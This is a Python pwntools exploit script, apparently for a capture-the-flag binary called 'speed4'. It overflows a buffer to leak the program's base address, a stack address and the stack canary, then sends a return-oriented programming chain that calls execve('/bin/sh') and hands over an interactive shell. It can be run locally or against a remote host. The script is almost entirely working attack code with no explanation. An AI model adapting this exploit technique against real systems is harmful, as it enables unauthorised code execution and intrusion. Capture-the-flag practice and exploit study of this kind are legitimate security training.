from pwn import *
elf = ELF("speed4")
context.log_level = "debug"

if len(sys.argv) > 1 and sys.argv[1] == "-gdb":
    r = gdb.debug(elf.path)
elif len(sys.argv) > 1 and sys.argv[1] == "-r":
    r = remote(remote_ip, port)
else:
    r = process(elf.path)

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()

#leak base_addr
sla(b"b0f: ", b"A" * 56)
ru(b"xfl: ")
ret = rl()
base = u64(ret[56: 62] + b"\x00\x00") - 0x1140
print(hex(base))
execve = base + 0x1120

#leak input_addr
sla(b"b0f: ", b"A" * 64)
ru(b"xfl: ")
ret = rl()
inp = u64(ret[64: 70] + b"\x00\x00")
input_addr = inp - (0x140)

#leak canary
sla(b"b0f: ", b"A" * 73)
ru(b"xfl: ")
ret = rl()
canary = b"\x00" + ret[73:80]

pop_rdi_ret = base + 0x00000000000015a3
pop_rsi_r15 = base + 0x00000000000015a1

payload = b"/bin/sh\x00"
payload += b"A" * 64
payload += canary
payload += b"B" * 8
payload += p64(pop_rdi_ret)
payload += p64(input_addr)
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(base + 0x10f0) #printf
payload += p64(pop_rdi_ret)
payload += p64(input_addr)
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(execve)

sla(b"b0f: ", payload)
r.interactive()